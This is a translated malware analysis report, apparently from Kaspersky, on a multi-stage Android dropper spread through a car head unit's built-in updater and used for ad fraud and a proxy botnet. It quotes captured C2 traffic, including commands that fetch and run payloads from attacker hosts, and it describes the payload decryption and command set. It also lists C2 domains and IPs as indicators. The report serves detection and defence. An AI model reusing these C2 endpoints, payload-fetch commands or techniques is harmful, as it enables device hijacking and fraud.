---
title: "安卓车机恶意软件"
title_en: "The invisible passenger in your car"
source_url: https://securelist.com/android-head-unit-malware/121106/
translated_at: 2026-08-24
tech_domain: android
tags: [android, security, malware, botnet, automotive]
cover_image: https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/08/21071446/android-head-unit-malware-scaled.jpg
---

# 安卓车机恶意软件

原文链接：<https://securelist.com/android-head-unit-malware/121106/>

![文章头图](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/08/21071446/android-head-unit-malware-scaled.jpg)

**2026 年 6 月监控安卓威胁时，我们发现一款新的安卓恶意软件：装法像普通用户应用，却完全不伪装成正规软件，也没有任何界面——像是在用户不知情时就装上了。后续调查证实了这一点，并还原了完整感染链。**

主要发现：

- 我们识别出新的安卓恶意软件：多阶段下载器，最终目的是广告欺诈，并组建代理僵尸网络（proxy botnet）。
- 恶意软件经**安卓车载中控（head unit）固件内置更新器**传播。这是首次公开记录的、在车机上发现恶意软件、且感染链专属于此类设备的案例。
- 我们高度确信，该活动可归因于与 BADBOX 僵尸网络相关的 **MoYu Group**。

卡巴斯基产品以如下检测名覆盖下文威胁：

- `HEUR:Trojan-Dropper.AndroidOS.Agent.vu`
- `HEUR:Trojan-Downloader.AndroidOS.Agent.ov`
- `HEUR:Trojan-Proxy.AndroidOS.Zhima.*`
- `HEUR:Trojan.AndroidOS.Vo1d.*`

## [车机固件概览](#head-unit-firmware-overview)

中控主机（head unit）把多媒体与部分车辆功能控制合在一起。可以是原厂标配，也可以是后装升级。这类系统的主要攻击面是：物理接触后的篡改，以及中控操作系统或组件里的漏洞——[我们以前写过](https://securelist.com/mercedes-benz-head-unit-security-research/115218/)。

有些中控跑在 Android 上，主要因为对厂商方便：安卓源码已覆盖车载中控场景，也允许厂商在构建时塞进自己的系统应用——定制 UI、加适配厂商需求的系统组件等。

多数为安卓设备写的应用也能在安卓中控上跑，恶意软件同理。不过，很难想象某些专打手机的恶意软件类别会用来打中控。银行木马就是例子：移动银行几乎只在手机上用，往中控塞银行木马对攻击者来说是浪费资源。

值得注意的是，中控常带 SIM 槽、能上网，从而支持导航和软件更新。中控里通常没什么对攻击者值钱的东西，因此用「经典」安卓恶意软件更可能的场景是：把设备收编进僵尸网络——类似打 IoT。

研究里我们正好撞上这类恶意软件。DoFun 中控固件的设计让攻击者得以分发恶意软件。我们已通知厂商分发机制，对方随后表示已修复相关安全问题。

下面是完整感染链：

![中控感染示意](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/08/20221354/head-unit-malware1.png)

中控感染示意

下面看这些中控具体是怎么被感染的。

## [TWCore 应用](#the-twcore-app)

TWCore 是合法的系统应用，负责收集分析数据并更新中控软件。先看更新怎么工作。

过程很简单。托管在子域 `cardoor[.]cn` 上的 MQTT 消息代理发来一条消息，描述需要下载并安装到中控上的 APK。描述该消息的对象里有个 `installNotExists` 字段，布尔值。为 true 时，TWCore 可以安装设备上原本没有的应用。

![仅当 installNotExists = false 时，TWCore 才检查应用是否已安装](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/08/20221442/head-unit-malware2.png)

仅当 `installNotExists = false` 时，TWCore 才检查应用是否已安装

APK 下载到 `<TWCore external cache dir>/push/apk/` 再安装。

![TWCore 下载 APK 的路径](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/08/20221522/head-unit-malware3.png)

TWCore 下载 APK 的路径

遥测里，这些路径上出现了此前未知的恶意软件。而且我们观察到的每一例，都是由包名 `com.tw.core` 的应用安装的——与 TWCore 包名一致。

接下来拆开 TWCore 装上的恶意软件：JarService dropper。

## [第一阶段：JarService dropper](#stage-1-the-jarservice-dropper)

如前所述，JarService 是个很小的 dropper，没有任何 UI。它解密木马代码里存成加密块的数据。每块用单字节密钥做 XOR，密钥在块与块之间线性偏移。解密后是序列化信息：payload 版本与入口点，以及后续加载用的恶意代码本身。

![解密并反序列化第二阶段 payload 信息](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/08/20221611/head-unit-malware4.png)

解密并反序列化第二阶段 payload 信息

我们分析的 JarService 版本里，下一阶段入口是 `com.c.j.qbh` 类的 `wa` 方法。

## [第二阶段：加载器](#stage-2-the-loader)

这一阶段的 payload 是恶意加载器。代码里有加密字符串，之后用作类名，经反射执行第三阶段 payload。加载器通过 POST 把植入信息发到攻击者某台服务器。发往 C2 的请求示例：

```json
{
  "userId": "REDACTED",
  "dexVersion": "1.7",
  "dexType": 1,
  "channelId": "2039",
  "packageName": "com.tw.jar1",
  "appVersion": 12,
  "appName": "JarService"
}
```

对 POST 的响应里，C2 返回下载第三阶段 payload 的链接。响应示例：

```json
{
  "code": 200,
  "data": {
    "dexUrl": "hxxp://144.217.243[.]201/vr34der34/dex3.68.png",
    "dexVersion": 3.680,
    "status": 0
  }
}
```

木马用 `data` 对象里 `dexUrl` 字段的链接，下载用于加载下一阶段的序列化数据。数据开头是一个单字节整数，用作解密加载器代码中字符串的密钥；紧接着四个字节浮点数，用于 XOR 解密第三阶段 payload，payload 本体就在这些密钥之后。

![解密第三阶段 payload](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/08/20221652/head-unit-malware5.png)

解密第三阶段 payload

解密后的 payload 入口是 `com.ast.sdk.BillingMain` 类的 `init` 方法，如下：

![第三阶段 payload 入口](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/08/20221750/head-unit-malware6.png)

第三阶段 payload 入口

分析这一阶段时，我们注意到下一阶段下载链接带版本号。于是试了其他版本号，拿到七个不同变种，列在文末「失陷指标」里。最早的 3.57 用的解码算法与上文不同——可能说明更早的感染链在 JarService 与第三阶段之间用过另一种加载器。

## [第三阶段：clicker / 反向代理加载器](#stage-3-clicker--reverse-proxy-loader)

这一阶段，恶意软件默认每 90 分钟向 `/cpc/api/task` 发一次 POST，带上受感染设备信息（分辨率、机型、已连 Wi-Fi 的 SSID、MAC 等）以及木马配置版本。若配置过期，C2 返回更新后的配置：新的 C2 地址与新的 HTTP 请求路径。响应示例如下。研究时最新配置版本是 3.82。

```json
{
  "code": 100,
  "data": {
    "configVersion": 3.820,
    "hosts": [
      "hxxp://t2.kshahnd[.]sbs",
      "hxxp://t2.mdsjhd[.]sbs",
      "hxxp://t2.nmnsny[.]sbs",
      "hxxps://t2.nmnsny[.]sbs"
    ],
    "interval": 5500000,
    "reportApi": "/cpc/api/report",
    "tagName": "config",
    "taskApi": "/cpc/api/task",
    "updates": [
      "hxxp://a2.kshahnd[.]sbs",
      "hxxp://a2.mdsjhd[.]sbs",
      "hxxp://a2.nmnsny[.]sbs",
      "hxxps://a2.nmnsny[.]sbs"
    ],
    "vn": 1.010
  }
}
```

若配置不必更新，C2 改返回整数命令标识，攻击者称为 `productId`。木马把每个标识映射到命令信息，以序列化 JSON 存进 SharedPreferences API。每个标识还有自己的版本，用 UNIX 时间戳表示。若响应里出现未知 `productId`，或版本已过期，恶意软件会对攻击者服务器发 GET `/cpc/api/xml`，拉取所有这些标识的命令内容。C2 为每个未知标识返回命令信息。响应示例：

```json
{
  "code": 200,
  "data": [
    {
      "productId": 979,
      "script": "{\"loadType\": 1, \"reload\": true, \"method\": \"start\", \"url2\": \"hxxp://144.217.243[.]201/vr34der34/sh65.io\", \"md52\": \"de77c3303e93c9450424759f1741441c\", \"name\": \"zhima\", \"className\": \"com.miyc.transfer.Client\", \"thread\": true, \"tagName\": \"loadlib2\", \"params\": [{\"type\": \"Context\"}, {\"type\": \"String\", \"value\": \"107.151.248[.]132\"}, {\"type\": \"String\", \"value\": \"1002\"}, {\"type\": \"int\", \"value\": 1337}, {\"type\": \"int\", \"value\": 7777}, {\"type\": \"int\", \"value\": 8888}, {\"type\": \"int\", \"value\": 15000}], \"url\": \"hxxp://144.217.243[.]201/vr34der34/sh65.io\", \"md5\": \"de77c3303e93c9450424759f1741441c\"}",
      "version": 1778650942
    },
    {
      "productId": 1019,
      "script": "{\"loadType\": 1, \"reload\": true, \"method\": \"start\", \"url2\": \"hxxp://144.217.243[.]201/vr34der34/sh65.io\", \"md52\": \"de77c3303e93c9450424759f1741441c\", \"name\": \"zhima\", \"className\": \"com.miyc.transfer.Client\", \"thread\": true, \"tagName\": \"loadlib2\", \"params\": [{\"type\": \"Context\"}, {\"type\": \"String\", \"value\": \"128.14.210[.]58\"}, {\"type\": \"String\", \"value\": \"1002\"}, {\"type\": \"int\", \"value\": 9999}, {\"type\": \"int\", \"value\": 7777}, {\"type\": \"int\", \"value\": 8888}, {\"type\": \"int\", \"value\": 15000}], \"url\": \"hxxp://144.217.243[.]201/vr34der34/sh65.io\", \"md5\": \"de77c3303e93c9450424759f1741441c\"}",
      "version": 1766001509
    },
    {
      "productId": 3505,
      "script": "{\"tagName\":\"http\",\"url\":\"hxxps://api.kookjar[.]com/sayhi?channel=daihai&uuid={get_uuid_10}\"}",
      "version": 1776656317
    }
  ],
  "msg": ""
}
```

命令信息含 `tagName` 字段，即命令名。代码把每个名字映射到负责执行的类。

![可执行命令列表](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/08/20221919/head-unit-malware7.png)

可执行命令列表

研究时攻击者已实现九条命令。下表为命令名、简要说明与参数。从功能看，恶意软件可用于展示广告、做广告欺诈（充当 clicker），以及下载额外恶意代码。

| 命令名 | 说明 | 参数 |
| --- | --- | --- |
| `return` | 从 SharedPreferences 返回一个值 | `key`：要返回值的键 |
| `copy` | 设置剪贴板内容 | `text`：从 SharedPreferences 取出并作为剪贴板内容的键；`url`：可选，下载 gzip 压缩数据的链接，解压后与 `text` 键的值拼接，中间用五个空格分隔 |
| `http` | 对指定资源发 POST/GET，并可按指示把响应存进 SharedPreferences 指定键 | `url`：资源地址；`method`：HTTP 方法名（可选）；`startLabel` / `endLabel`：从资源中截取保存段的起止标记（可选）；`valueLabel`：保存用的键（可选）；`header`：请求头字典（可选）；`content`：POST 正文（可选） |
| `web` | 在 WebView 打开链接并执行任意 JavaScript | `url`：在 WebView 打开的链接；`js`：在 WebView 执行的 base64 编码 JS（`url` 为空或缺省时用）；`corejs`：资源在 WebView 加载时执行的 JS（可选）；`param`：启动 WebView 的参数字符串字典；`client`：若存在则用 WebViewClient 手动处理重定向；`time`：任务超时 |
| `loadlib` | 发布本文时尚未完全实现 | — |
| `loadlib2` | 下载并执行任意代码 | `url`：payload 下载地址；`name`：模块名；`md5`：payload 的 MD5；`clear`：可选，逗号分隔、要删除的 payload 名；`params`：启动 payload 的参数数组；`className`：入口类名；`method`：入口虚方法名；`cmethod`：可选，实例化入口类的静态方法名；`thread`：未设置时 payload 在独立线程跑；`reload`：设置则重启已加载模块 |
| `loadlib3` | 发布本文时尚未完全实现 | — |
| `deeplink` | 在浏览器打开资源 | `url`：资源链接 |
| `traceroute` | 用 ICMP ping 检查资源可达性 | `host`：逗号分隔的待检查资源 |

实战里攻击者只用其中较小子集。如上例 C2 响应，发布时主要在用 `loadlib2` 与 `http`。经 `loadlib2` 下载的 payload 是名为 **zhima** 的反向代理模块；Nokia Deepfield Emergency Response Team 约在同一时期在电视盒子上独立发现并[描述](https://github.com/deepfield/public-research/blob/main/ipmoyu/report.md)。这印证攻击者最终目标是建代理僵尸网络。

查这一阶段时，我们注意到 zhima 下载链接也带版本号。与前一阶段一样，试了其他版本号，找到八个 zhima 变种，最早为 57。完整列表见下文「失陷指标」。

## [归因](#attribution)

梳理完整感染链时，第二阶段加载器创建了名为 `mosdk-host-loader` 的线程。我们查了 `mosdk` 指什么，找到装在各类电视盒子上的恶意应用，包名 `com.abc.nexus`（哈希 `3AD4BF5A86D26FFBF09CAE42AF330A98`）。它由多个组件组成（含类似 JarService 的 dropper），各自用于悄悄变现设备算力。每个恶意组件对应一个服务；含 JarService 类 dropper 启动代码的服务叫 `AdmoyuService`。结合 payload 里恶意线程名，我们判断服务名里的 `moyu` 指向 **MoYu Group**——与 BADBOX 恶意平台相关的行为者之一，HUMAN 研究者曾[描述](https://www.humansecurity.com/learn/blog/satori-threat-intelligence-disruption-badbox-2-0/)。恶意软件网络基础设施与 MoYu Group 大量重叠，也支持这一判断；Nokia Deepfield 团队约在同一时期独立识别。基于命名模式相似与基础设施显著重叠，我们高度确信本文所述攻击与同一行为者有关。

调查 TWCore 下载的恶意软件时，我们注意到域名 `admin.uipoxy[.]com` 解析到 `128.14.210[.]58`——zhima 反向代理模块的 C2 之一。`hxxp://admin.uipoxy[.]com/proxy/u/login` 似乎托管着 zhima 管理面板。有意思的是：只要邀请码有效，任何人都能注册。

![恶意软件运营者注册页](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/08/20222009/head-unit-malware8.png)

恶意软件运营者注册页

注册时会提示阅读使用条款与隐私政策，文档挂在 `pxyedge[.]com` 下——属于专卖住宅代理的厂商 PXYEDGE。

在 `admin.uipoxy[.]com` 注册页上还有字符串 `copyright©2020 proxyforu[.]com all rights reserved`，链到 `hxxps://proxyforu[.]com`，即另一家住宅代理服务商 ProxyForU 的站点。

这些站点的认证 API 有若干相似点：

- 登录页挂在 `admin.*` 子域
- 登录路径为 `/proxy/u/login`
- 注册路径为 `/proxy/register?channelKey=<邀请码>`

据此，我们认为这些服务与 MoYu Group 有关。

## [结论](#conclusion)

尽管网络安全从业者与执法部门努力关停 BADBOX 僵尸网络，与之相关的个体仍在作恶，感染全球设备。这类恶意软件的投递方式五花八门：从预装后门下载，到被感染的 IPTV 应用构建。本案展示了更精细的投递：经**系统应用合法更新功能**分发。攻击者也在积极扩到新平台。这是已知首个瞄准中控的恶意应用——意味着这些平台同样需要防恶意软件。

## [失陷指标](#indicators-of-compromise)

### 第一阶段：JarService

[ba27951b4ee1c341f4415d033369ecd3](https://opentip.kaspersky.com/ba27951b4ee1c341f4415d033369ecd3/results?icid=gl_sl_post-opentip_sm-team_eb0e1a91076730a8&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[d63bacd6d6709dd68a10ef9d374c7835](https://opentip.kaspersky.com/d63bacd6d6709dd68a10ef9d374c7835/results?icid=gl_sl_post-opentip_sm-team_aebc22e63cc04652&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[6c2e34b30da42085240ede53ab6107d4](https://opentip.kaspersky.com/6c2e34b30da42085240ede53ab6107d4/results?icid=gl_sl_post-opentip_sm-team_ad3b204e6b047a3a&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[8b5e513144a6138a966ea59e68bf9da2](https://opentip.kaspersky.com/8b5e513144a6138a966ea59e68bf9da2/results?icid=gl_sl_post-opentip_sm-team_2071c71eee4d4f48&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[e119845877089d6f4b0a70dc7388f316](https://opentip.kaspersky.com/e119845877089d6f4b0a70dc7388f316/results?icid=gl_sl_post-opentip_sm-team_f011c7e096211908&utm_source=SL&utm_medium=SL&utm_campaign=SL)

### 第二阶段：加载器

[e9f3a0dab6949ce2cddab9e0aa80ae1a](https://opentip.kaspersky.com/e9f3a0dab6949ce2cddab9e0aa80ae1a/results?icid=gl_sl_post-opentip_sm-team_3086c1d2b8c6dadb&utm_source=SL&utm_medium=SL&utm_campaign=SL)

### 第三阶段：加载器 / clicker

[0fbaa7092204f4b1494e0b840b014774](https://opentip.kaspersky.com/0fbaa7092204f4b1494e0b840b014774/results?icid=gl_sl_post-opentip_sm-team_8ca673e23ef1d7d4&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[1dcf031c40ce456b6a36a00b0acf3d11](https://opentip.kaspersky.com/1dcf031c40ce456b6a36a00b0acf3d11/results?icid=gl_sl_post-opentip_sm-team_432a1b975c97c0be&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[44b6b213a6a3f299eaf88e078de95ecb](https://opentip.kaspersky.com/44b6b213a6a3f299eaf88e078de95ecb/results?icid=gl_sl_post-opentip_sm-team_a135a5e9b7ff4869&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[67dc78e544ebce16b85dc7c195dfbc58](https://opentip.kaspersky.com/67dc78e544ebce16b85dc7c195dfbc58/results?icid=gl_sl_post-opentip_sm-team_73efed65bfd8afcd&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[9642ae619b3165d23c6349002d1abe24](https://opentip.kaspersky.com/9642ae619b3165d23c6349002d1abe24/results?icid=gl_sl_post-opentip_sm-team_214a5b59ad0290cc&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[b067d5b0dbecbd6498bcdfba45dba77e](https://opentip.kaspersky.com/b067d5b0dbecbd6498bcdfba45dba77e/results?icid=gl_sl_post-opentip_sm-team_20a2ebc1b8c6fec6&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[f0e3f7eba2cde91e2dedb921bab47422](https://opentip.kaspersky.com/f0e3f7eba2cde91e2dedb921bab47422/results?icid=gl_sl_post-opentip_sm-team_8512533cba8e1f41&utm_source=SL&utm_medium=SL&utm_campaign=SL)

### zhima 模块

[412e9243f2981bbea3894254d105b3b8](https://opentip.kaspersky.com/412e9243f2981bbea3894254d105b3b8/results?icid=gl_sl_post-opentip_sm-team_6b7e557ea65ed8a1&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[71ab5517f71866279d0d87d37f2ae320](https://opentip.kaspersky.com/71ab5517f71866279d0d87d37f2ae320/results?icid=gl_sl_post-opentip_sm-team_b4aeb6e9daf65d95&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[89ef78f716a75964539f2db6520be362](https://opentip.kaspersky.com/89ef78f716a75964539f2db6520be362/results?icid=gl_sl_post-opentip_sm-team_2aab7272fe595787&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[a4223ce4288a230d1e6c3ff2c7639045](https://opentip.kaspersky.com/a4223ce4288a230d1e6c3ff2c7639045/results?icid=gl_sl_post-opentip_sm-team_e46d364c00b24c45&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[bd4d81cd27125ad3d9a114922d468499](https://opentip.kaspersky.com/bd4d81cd27125ad3d9a114922d468499/results?icid=gl_sl_post-opentip_sm-team_9ae7b61335fd348e&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[c6bfb1643ac7474ed8a7b4f96a187fdb](https://opentip.kaspersky.com/c6bfb1643ac7474ed8a7b4f96a187fdb/results?icid=gl_sl_post-opentip_sm-team_0fdb9ba00a5efe0a&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[de77c3303e93c9450424759f1741441c](https://opentip.kaspersky.com/de77c3303e93c9450424759f1741441c/results?icid=gl_sl_post-opentip_sm-team_a9a1239339fbf2eb&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[f8cf8c23ff597700d471fb7767df8bac](https://opentip.kaspersky.com/f8cf8c23ff597700d471fb7767df8bac/results?icid=gl_sl_post-opentip_sm-team_e996fad8820e5d83&utm_source=SL&utm_medium=SL&utm_campaign=SL)

### 域名与 IP

[xmsae[.]sbs](https://opentip.kaspersky.com/xmsae.sbs/?icid=gl_sl_post-opentip_sm-team_af53b7390ad56d10&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[ishano456[.]sbs](https://opentip.kaspersky.com/ishano456.sbs/?icid=gl_sl_post-opentip_sm-team_15ca4c0b8a49e1ab&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[xshaon123[.]sbs](https://opentip.kaspersky.com/xshaon123.sbs/?icid=gl_sl_post-opentip_sm-team_f2d45150d16a123e&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[kshahnd[.]sbs](https://opentip.kaspersky.com/kshahnd.sbs/?icid=gl_sl_post-opentip_sm-team_6c4c102147179116&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[mdsjhd[.]sbs](https://opentip.kaspersky.com/mdsjhd.sbs/?icid=gl_sl_post-opentip_sm-team_7045e8a7bd52b4be&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[nmnsny[.]sbs](https://opentip.kaspersky.com/nmnsny.sbs/?icid=gl_sl_post-opentip_sm-team_f337a7f06fa5c42c&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[kookjar[.]com](https://opentip.kaspersky.com/kookjar.com/?icid=gl_sl_post-opentip_sm-team_8417d16bd4cdf399&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[ty54fgd435[.]my](https://opentip.kaspersky.com/ty54fgd435.my/?icid=gl_sl_post-opentip_sm-team_fed8e37796b7f171&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[ue886578433[.]online](https://opentip.kaspersky.com/ue886578433.online/?icid=gl_sl_post-opentip_sm-team_8f073e94983be24f&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[ty4523[.]space](https://opentip.kaspersky.com/ty4523.space/?icid=gl_sl_post-opentip_sm-team_eedda46b6715dbf4&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[144.217.243[.]201](https://opentip.kaspersky.com/144.217.243.201/?icid=gl_sl_post-opentip_sm-team_36fb15ab2c595ccb&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[107.151.248[.]132](https://opentip.kaspersky.com/107.151.248.132/?icid=gl_sl_post-opentip_sm-team_7f6c2171856a87c9&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[128.14.210[.]58](https://opentip.kaspersky.com/128.14.210.58/?icid=gl_sl_post-opentip_sm-team_27eb5c2f48463693&utm_source=SL&utm_medium=SL&utm_campaign=SL)

### 用于下载 JarService 的地址

[hxxp://ovcloudcontrol.cdn.cardoor[.]cn/upgrade/2026-06-08/bd80bd3c3d0e4bf6b5b4a825650d01f5.apk](https://opentip.kaspersky.com/hxxp%3a%2f%2fovcloudcontrol.cdn.cardoor.cn%2fupgrade%2f2026-06-08%2fbd80bd3c3d0e4bf6b5b4a825650d01f5.apk/?icid=gl_sl_post-opentip_sm-team_6fa27f6e45e16a27&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[hxxp://ovcloudcontrol.cdn.cardoor[.]cn/upgrade/2025-06-10/fe71af9ecf174de48d2b2ccc2c15fb04.apk](https://opentip.kaspersky.com/hxxp%3a%2f%2fovcloudcontrol.cdn.cardoor.cn%2fupgrade%2f2025-06-10%2ffe71af9ecf174de48d2b2ccc2c15fb04.apk/?icid=gl_sl_post-opentip_sm-team_355b852b88a5dcdb&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[hxxp://ovcloudcontrol.cdn.cardoor[.]cn/upgrade/2024-11-07/fa831c3c23824b99871163387bcda7ad.apk](https://opentip.kaspersky.com/hxxp%3a%2f%2fovcloudcontrol.cdn.cardoor.cn%2fupgrade%2f2024-11-07%2ffa831c3c23824b99871163387bcda7ad.apk/?icid=gl_sl_post-opentip_sm-team_e15c21f403bffa54&utm_source=SL&utm_medium=SL&utm_campaign=SL)

### TWCore 哈希（用于分发 JarService 的合法软件）

`2a64c3efc11bf224aa54f24e876446c9`

`7a4d3ba2dacccfdda55859a5dfee2671`

`ea24487996eb70c1780922fb3063bcc5`
